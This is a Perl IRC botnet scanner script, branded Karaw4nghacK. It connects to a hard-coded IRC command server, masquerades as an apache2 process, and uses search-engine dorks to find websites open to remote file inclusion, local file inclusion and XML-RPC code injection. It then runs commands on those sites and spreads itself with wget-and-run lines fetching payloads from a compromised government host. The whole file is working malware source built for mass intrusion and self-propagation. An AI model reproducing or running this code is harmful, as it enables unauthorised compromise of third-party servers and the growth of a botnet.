#!/usr/bin/perl
# Multi Bot Scanner
# Powered @ 2010
#########################################################
$powered="Karaw4nghacK";
$mail="shepdoy(at)yahoo.com";
#########################################################
my $proses = "/usr/sbin/apache2 -k start";
#########################################################
my $server	= "200.75.12.211";
my $port	= "6667";
my $nick	= "sely".(int(rand(99)));
my $chan	= "#fronteira";
my $admin	= "hostdevil";
############# Setting ID & Spread ##############
my $shell	= "http://www.miranda.gov.ve/modules/mod_sections/helper.gif?";
my $tombak	= "http://www.miranda.gov.ve/bombona/xml.txt??";	#
my $lficek	= "../../../../../../../../../../../../../../../../proc/self/environ%00";
my $botphp	= "http://www.miranda.gov.ve/modules/mod_sections/download.jpg";				# Spread bot php
my $botperl	= "http://www.miranda.gov.ve/modules/mod_sections/download.jpg";					# Spread PerL
my $lfispread	= "wget http://www.miranda.gov.ve/images/pl.txt; perl pl.txt; rm -f pl.txt*";			# Spread LFI
my $xmlspread	= "cd /tmp; wget http://www.miranda.gov.ve/images/pl.txt; perl pl.txt; rm -f pl.txt*";	# Spread XML
######## Setting Perintah #######
my $rfi		="!rfi";
my $lfi		="!lfi";
my $cmdlfi	="!cmdlfi";
my $xml		="!xml";
my $cmdxml	="!cmdxml";
##################### Setting Selesai #####################
# Untuk sisanya tidak perlu dirubah kalo tidak mengerti
# karena mungkin akan menyebabkan bot tidak jalan
###########################################################
use HTTP::Request;
use HTTP::Request::Common;
use LWP::UserAgent;
use LWP::Simple;
use LWP 5.64;
use IO::Socket::INET;
use IO::Socket;
use IO::Select;
use Socket;
############################
&copyright();
my $pid=fork;
exit if $pid;
$0="$proses"."\0"x16;
my $pesan = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$port",Proto=>"tcp") or die "Server DoyoOokKk!\n";
$pesan->autoflush(1);
print $pesan "NICK $nick\r\n";
print $pesan "USER KcB 8 * : -xXx- Karawang-Cyber.Inc\r\n";
print $pesan "JOIN $chan\r\n";
while($perintah = <$pesan>){
$perintah =~ s/\r\n$//;
if ($perintah=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $pesan "PONG :$1";
}

### Commands ###
if ($perintah=~ /PRIVMSG $chan :!help/){
kirim($pesan, "PRIVMSG $chan :6$rfi3 Memulai scan Rfi");
kirim($pesan, "PRIVMSG $chan :6$lfi3 Memulai Scan Lfi");
kirim($pesan, "PRIVMSG $chan :6$xml3 Memulai Scan Xml");
kirim($pesan, "PRIVMSG $chan :6$cmdlfi3 (Target) (Linux Cmd)");
kirim($pesan, "PRIVMSG $chan :6$cmdxml3 (Target) (Linux Cmd)");
}

if ($perintah=~ /PRIVMSG $chan :!id/){
&cekid();
}

if ($perintah=~ /PRIVMSG $chan :!pid/){
kirim($pesan, "PRIVMSG $chan :6pid = $proses - $$");
}

### Cek ID ###
sub cekid() {
my $re = surfing($tombak);
if ($re =~ /shepdoy/) {
kirim($pesan, "PRIVMSG $chan :6 ID Bagus!");
} else {
kirim($pesan, "PRIVMSG $chan :4 ID Doyox!");
}
}

###### perintah RFI ######
if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :3Rfi Scanner by stealth");
kirim($pesan, "PRIVMSG $chan :6bug4 $rusak");
kirim($pesan, "PRIVMSG $chan :6dork4 $kunci");
kirim($pesan, "PRIVMSG $chan :2Saya Carikan Dulu Silahkan Tunggu...");
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

###### Perintah LFI ######

if ($perintah=~ /PRIVMSG $chan :$cmdlfi\s+(.*?)\s+(.*)/){
my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
my $cmd = $2;
cmdlfi($url,$cmd);
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :3LFi Scanner by stealth");
kirim($pesan, "PRIVMSG $chan :6bug4 $rusak");
kirim($pesan, "PRIVMSG $chan :6dork4 $kunci");
kirim($pesan, "PRIVMSG $chan :2Saya Carikan Dulu Silahkan Tunggu...");
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

##### Peintah XML ######

if ($perintah=~ /PRIVMSG $chan :$cmdxml\s+(.*?)\s+(.*)/){
my $url = $1;
my $cmd = $2;
cmdxml($url,$cmd);
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :3Xml Scanner by stealth");
kirim($pesan, "PRIVMSG $chan :6bug4 $rusak");
kirim($pesan, "PRIVMSG $chan :6dork4 $kunci");
kirim($pesan, "PRIVMSG $chan :2Saya Carikan Dulu Silahkan Tunggu...");
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

#### Cek RFI ######
sub rfiscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
}
my $cektarget 	= "http://".$target.$rusak.$tombak."?";
my $inject		= "http://".$target."12".$rusak."7".$shell."?";
my $re   = surfing($cektarget);
if($re =~ /shepdoy/){
os($cektarget);
kirim($pesan, "PRIVMSG $chan :6 $inject ");
kirim($pesan, "PRIVMSG $chan :3 $os ");
kirim($pesan, "PRIVMSG $admin :6 $inject 3 $os ");
### Spread RFI ###
my $rfiphp 	= "http://".$target.$rusak.$botphp."?";
my $re   = surfing($rfiphp);
my $rfiperl = "http://".$target.$rusak.$botperl."?";
my $re   = surfing($rfiperl);
### oFF ###
}
}
}

#### Cek LFI ######

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "jcfs<?system(\"$cmd 2> /dev/stdout\"); ?>jcfs";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /jcfs(.*)jcfs/s) {
print $1;
kirim($pesan, "PRIVMSG $chan :6 $1 ");
}
}


sub lfiscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
}
my $cektarget 	= "http://".$target.$rusak.$lficek;
my $inject 	= "http://".$target.$rusak.$lficek;
my $re   = surfing($cektarget);
if ($re  =~ /DOCUMENT_ROOT/){
if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
my $test = lfiquery($cektarget,"uname -a;echo KcB;id;$lfispread");
$test =~ s/\n//g;
if ($test =~ /KcB#(.*)KcBuid=(.*)#KcB/sg) {
my ($osx,$uid) = ($1,$2);
kirim($pesan, "PRIVMSG $chan:6 $inject ");
kirim($pesan, "PRIVMSG $chan:3 $osx ");
kirim($pesan, "PRIVMSG $admin:6 $inject 3 $osx ");
} else {
#kirim($pesan, "PRIVMSG $chan:4 $inject ");
}
} exit } sleep(3);
}
}
}

sub lfiquery() {
my $url = $_[0];
my $rce = $_[1];
my $agent = "<?php echo \"KcB#\"; passthru(\'".$rce."\'); echo \"#KcB\"; ?>";
my $ua = LWP::UserAgent->new(agent => $agent);
$ua->timeout(7);
my $req = HTTP::Request->new(GET => $url);
my $response = $ua->request($req);
return $response->content;
}

#### Cek XmL ######

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,
Content_Type => 'text/xml',
Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
kirim($pesan, "PRIVMSG $chan :6 $1 ");
}
}



sub xmlscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
}
my $cektarget 	= "http://".$target.$rusak;
my $re   = surfing($cektarget);
if($re =~ /faultCode/){
xmlcek($cektarget);
xmlvuln($cektarget);
xmlxspread($cektarget,$xmlspread);
kirim($pesan, "PRIVMSG $chan :8,1 Monggo ");
kirim($pesan, "PRIVMSG $chan :4Xml Vuln6 $shellx 3 $os");
}
}
}

sub xmlcek() {
my $colok = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'KcB';echo`uname -a`;echo'KcB';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /KcB(.*)KcB/s) {
$os=$1;
}}

sub xmlvuln() {
my $colok = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'Bitch'.'X';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /BitchX/) {
$shellx=$colok;
}}

sub xmlxspread() {
my $colok = $_[0];
my $cucuk = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'shep';echo`".$cucuk."`;echo'doy';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
}}

#######
# Sub Surfing
##################
sub surfing() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}

#######
## Sub Kirim
##############
sub kirim(){
if ($#_ == '1') {
my $pesan = $_[0];
print $pesan "$_[1]\n";
} else {
print $pesan "$_[0]\n";
}}

#####
# Sub OS
#########
sub os() {
    my $target=$_[0];
    my $re  = &query($target);
    while ($re =~ m/<br>OSTYPE:(.+?)\<br>/g) {
        $os = $1;
    }
}

#########
# Sub Engine
###############
sub google(){
    my @lst;
    my $key = $_[0];
    for ($b=0;$b<=1000;$b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub naver() {
    my @lst;
    my $key = $_[0];
    for ( $b=1;$b<=1000;$b+=10){
        my $naver = ( "http://web.search.naver.com/search.naver?where=webkr&query=".key($key)."&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=".$b);
        my $Res = query($naver);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
            my $k = $1;
            if ($k!~/busca|uol|yahoo/) {
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep);
            }
        }
    }
 return @lst;
}

sub onet(){
	my @lst;
	my $key = $_[0];
	for($b=0;$b<=50;$b+=1){#20
		my $Lyc=("http://szukaj.onet.pl/query.html?qt=".key($key)."&p=".$b);
		my $Res=query($Lyc);
		while($Res =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g){
			my $k=$1;
			my @grep=links($k);
				push(@lst,@grep);
			}
		}
	return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://nl.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub links(){
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub copyright() {
if (($powered !~ /4/)||($mail !~ /pd/)) {
print "\nDasar Doyok!!! Bodoh ToloL Oon Doyok!!! Udah Gak Usah diRubah Lagi!!! \nby shepdoy// KarawanghacK\n\n";
exec("rm -rf $0 && pkill perl");
}
}

sub query($) {
my $url = $_[0];
$url =~ s/http:\/\///;
my $host  = $url;
my $query = $url;
my $page  = "";
$host  =~ s/href=\"?http:\/\///;
$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~ s/$host//;
if ( $query eq "" ) { $query = "/"; }
eval {
my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page = "@r";
close($sock);
};
return $page;
}

sub hitung {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

### EOF ###